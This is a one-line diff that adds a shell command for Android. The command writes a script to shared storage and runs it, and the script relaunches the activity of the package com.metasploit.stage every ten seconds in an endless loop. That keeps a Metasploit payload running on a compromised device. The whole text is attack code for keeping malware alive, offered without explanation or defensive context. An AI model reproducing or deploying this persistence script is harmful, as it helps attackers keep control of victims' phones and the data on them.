@@ -1,0 +1,1 @@
+echo "#\!/bin/bash \n while true \n do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity \n sleep 10 \n done" > /storage/emulated/0/per.sh;sh per.sh
